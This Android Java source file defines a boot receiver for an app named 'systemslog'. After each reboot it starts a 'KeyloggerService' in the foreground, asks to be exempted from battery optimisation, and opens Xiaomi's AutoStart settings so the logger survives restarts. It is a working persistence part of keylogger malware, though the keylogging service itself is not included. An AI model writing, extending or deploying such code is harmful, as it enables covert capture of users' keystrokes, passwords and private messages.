package com.example.systemslog;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.net.Uri;
import android.util.Log;
import android.widget.Toast;

import androidx.core.content.ContextCompat;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d(TAG, "✅ Device rebooted. Starting KeyloggerService...");
            Toast.makeText(context, "🔓 Boot detected. Starting logger...", Toast.LENGTH_SHORT).show();

            // Start KeyloggerService
            Intent serviceIntent = new Intent(context, KeyloggerService.class);
            ContextCompat.startForegroundService(context, serviceIntent);

            // Try to disable battery optimizations
            disableBatteryOptimizations(context);

            // Try to guide user to allow autostart on Xiaomi
            openAutoStartSettings(context);

        } else {
            Log.d(TAG, "❌ Unknown boot action received: " + intent.getAction());
        }
    }

    private void disableBatteryOptimizations(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            String packageName = context.getPackageName();

            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                Log.d(TAG, "⚙️ Requested battery optimization whitelist.");
            }
        }
    }

    private void openAutoStartSettings(Context context) {
        try {
            Intent intent = new Intent();
            intent.setClassName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Log.d(TAG, "⚙️ Trying to open Xiaomi AutoStart settings.");
        } catch (Exception e) {
            Log.e(TAG, "⚠️ Unable to open AutoStart settings", e);
        }
    }
}
